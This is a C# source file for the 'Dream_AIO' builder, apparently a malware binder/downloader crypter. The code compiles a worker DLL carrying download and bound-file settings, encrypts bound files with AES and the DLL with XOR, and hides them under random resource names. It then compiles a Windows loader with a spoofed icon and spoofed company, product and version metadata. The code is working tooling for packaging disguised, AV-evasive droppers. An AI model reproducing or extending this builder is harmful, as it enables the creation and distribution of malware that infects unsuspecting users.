using System;
using System.Collections.Generic;
using System.IO;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Dream_AIO
{
    public class Builder
    {
        public Logger Logger { get; set; }

        public bool Build(SettingsFile settings,string file)
        {
            List<string> loaderResources = new List<string>();

            List<string> serSettings = new List<string>();

     

            string defines = "";

            if (settings.DownloadFiles.Count > 0)
            {
                Logger.LogInformation("Encoding downloader options...");

                defines += "DOWNLOADER;";
                foreach (DownloaderSetting ds in settings.DownloadFiles)
                {
                    serSettings.Add(SerializeDictionary(ds.Dictionarize()));
                }
            }

            string dllSource = Properties.Resources.Worker;

            if (settings.BindFiles.Count > 0)
            {

                Logger.LogInformation("Encoding binder options...");

                Logger.LogInformation("Generating binder resources...");

                string binderResourceName = GenerateBinderResources(settings, serSettings);

                dllSource = dllSource.Replace("%RESNAME%", binderResourceName);
                loaderResources.Add(binderResourceName);
                defines += "BINDER;";
            }
         

          

            dllSource = dllSource.Replace("/*SERIALIZED_SETTINGS*/", WriteSettingsList(serSettings, "options"));

            /*SERIALIZED_SETTINGS*/


            if (settings.CompressFiles)
            {
                defines += "COMPRESSION;";
            }

            if (settings.EncryptFiles)
            {
                defines += "ENCRYPTION;";
            }

            string outPath = string.Format("{0}.dll", WordGen.GenWord(5));

            Logger.LogInformation("Compiling library...");

            if (!Codedom.Compile(outPath, "cs", new string[] { dllSource }, null, defines, null, null, "library", 20))
            {
                return false;
            }

            byte[] dll = File.ReadAllBytes(outPath);

            File.Delete(outPath);



            string dllResourceName = string.Format("{0}.resources",WordGen.GenWord(5));

            string dllResourceId = string.Format("{0}.dat",WordGen.GenWord(5));

            Logger.LogInformation("Encrypting library...");

            byte[] key = new byte[WordGen.R.Next(16, 24)];

            WordGen.R.NextBytes(key);

            for(int i = 0; i < dll.Length;i++)
            {
                dll[i] = (byte)(dll[i] ^ key[i % key.Length]);
            }

            using(ResourceWriter rw = new ResourceWriter(dllResourceName))
            {
                rw.AddResource(dllResourceId, dll);
                rw.Generate();
            }

            loaderResources.Add(dllResourceName);
            
            string loaderSource = Properties.Resources.Loader;

            outPath = file;

            loaderSource = loaderSource.Replace("/*ASM_INFO*/", GenerateAssemblyInfoSource(settings));

            loaderSource = loaderSource.Replace("%KEY%",Convert.ToBase64String(key));
            loaderSource = loaderSource.Replace("%RESNAME%", dllResourceName);
            loaderSource = loaderSource.Replace("%RESID%", dllResourceId);

            Logger.LogInformation("Compiling loader...");

            if (!Codedom.Compile(outPath, "cs", new string[] { loaderSource }, settings.IconPath, null, new string[] { "System.Drawing.dll", "System.Windows.Forms.dll" }, loaderResources.ToArray(), "winexe", 20))
            {
                return false;
            }


            Logger.LogSuccess("Done");

            return true;
        }

        private string WriteSettingsList(List<string> s,string varName)
        {
            StringBuilder sb = new StringBuilder();
            foreach (string x in s)
            {
                sb.AppendFormat("{0}.Add(\"{1}\");\r\n", varName,x);
            }
            return sb.ToString();
        }

        private string GenerateAssemblyInfoSource(SettingsFile settings)
        {
            StringBuilder sb = new StringBuilder();
            // settings.ass

            sb.AppendLine("using System.Reflection;");
            sb.AppendLine("using System.Runtime.CompilerServices;");
            sb.AppendLine("using System.Runtime.InteropServices;");

            sb.AppendFormat("[assembly: AssemblyTitle(\"{0}\")]\r\n", settings.AssemblyDescription);

            sb.AppendLine("[assembly: AssemblyDescription(\"\")]");
            sb.AppendLine("[assembly: AssemblyConfiguration(\"\")]");

            sb.AppendFormat("[assembly: AssemblyCompany(\"{0}\")]\r\n", settings.AssemblyCompany);
            sb.AppendFormat("[assembly: AssemblyProduct(\"{0}\")]\r\n", settings.AssemblyProductName);
            sb.AppendFormat("[assembly: AssemblyCopyright(\"{0}\")]\r\n", settings.AssemblyCopyright);
            sb.AppendLine("[assembly: AssemblyTrademark(\"\")]");
            sb.AppendLine("[assembly: AssemblyCulture(\"\")]");

            sb.AppendFormat("[assembly: Guid(\"{0}\")]", Guid.NewGuid().ToString("D"));
            sb.AppendFormat("[assembly: AssemblyVersion(\"{0}\")]", settings.AssemblyVersion);
            sb.AppendFormat("[assembly: AssemblyFileVersion(\"{0}\")]", settings.AssemblyVersion);


            return sb.ToString();
          
        }

        private string GenerateBinderResources(SettingsFile settings,List<string> serSettings)
        {
            string resourceName = string.Format("{0}.resources", WordGen.GenWord(5));

            using (ResourceWriter rw = new ResourceWriter(resourceName))
            {

                foreach (BinderSetting ds in settings.BindFiles)
                {

                    Dictionary<string, string> dic = ds.Dictionarize();

                    byte[] boundFile = File.ReadAllBytes(ds.FileName);

                    if (settings.CompressFiles)
                    {
                        boundFile = QuickLz.Compress(boundFile);
                    }

                    if (settings.EncryptFiles)
                    {
                        using (RijndaelManaged rij = new RijndaelManaged())
                        {
                            rij.GenerateKey();
                            rij.GenerateIV();

                            dic.Add("ek", Convert.ToBase64String(rij.Key)); //encryption key
                            dic.Add("ei", Convert.ToBase64String(rij.IV)); //encryption iv

                            using (ICryptoTransform ict = rij.CreateEncryptor())
                            {
                                boundFile = ict.TransformFinalBlock(boundFile, 0, boundFile.Length);
                            }

                        }
                    }

                    string resKey = string.Format("{0}.dat", WordGen.GenWord(5));

                    dic.Add("r_k", resKey);

                    rw.AddResource(resKey, boundFile);

                    serSettings.Add(SerializeDictionary(dic));
                }

                rw.Generate();


            }
            return resourceName;
        }

        //foreach binded file a res file or not no

        private string SerializeDictionary(Dictionary<string, string> options)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (BinaryWriter bw = new BinaryWriter(ms, Encoding.UTF8))
                {
                    bw.Write(options.Count);
                    foreach (var k in options)
                    {
                        bw.Write(k.Key);
                        bw.Write(k.Value);
                    }

                }
                return Convert.ToBase64String(ms.ToArray());
            }
        }
    }
}
